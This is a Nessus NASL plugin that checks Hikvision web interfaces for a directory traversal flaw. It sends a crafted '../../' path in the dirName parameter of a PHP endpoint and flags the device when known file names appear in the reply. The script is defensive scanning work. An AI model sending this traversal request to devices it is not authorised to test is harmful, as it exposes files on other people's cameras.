###############################################################################
# Nessus Vulnerability Test
#
###############################################################################

if(description)
{
  script_id(51799098);
  script_version("$Revision: 10852 $");
  script_name(english:"Hikvision Directory traversal vulnerability");
  
  script_category(ACT_GATHER_INFO);
  script_copyright("This script is Copyright (C) 2005 WEBRAY");
  script_set_attribute(attribute:"risk_factor", value:"High");
  script_family(english:"Camera");
  script_dependencies( "http_version.nasl");
  script_require_ports("Services/www", 80);
  script_set_attribute(attribute:"solution", value:"update to the new version");
  script_set_attribute(
    attribute:"description",
    value:"Detect Hikvision Directory traversal vulnerability.");
  exit(0);
}

include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");
include("webapp_func.inc");



port=get_http_port(default:80);
#display("port=="+port);


 url='/data/fetchPlugJsonByFolder.php?dirName=../../vag/pag/web/html/data/'; 
 req = http_get(item:url, port:port);  
 res = http_keepalive_send_recv(port:port, data:req); 
 
 if("200 OK"><res && "checkcameranameinonedevice.php"><res && "fetchvtdunetandlink.php"><res){
	if (report_verbosity > 0)
	{
	  header = 'Directory traversal with the following URL';
	  report = get_vuln_report(
		items  : url,
		port   : port,
		header : header
	  );
	  security_hole(port:port, extra:report);
	}
if (report_verbosity > 0) security_hole(port:port, extra:req+res);
			  else security_hole(port);
 }	 

exit(0);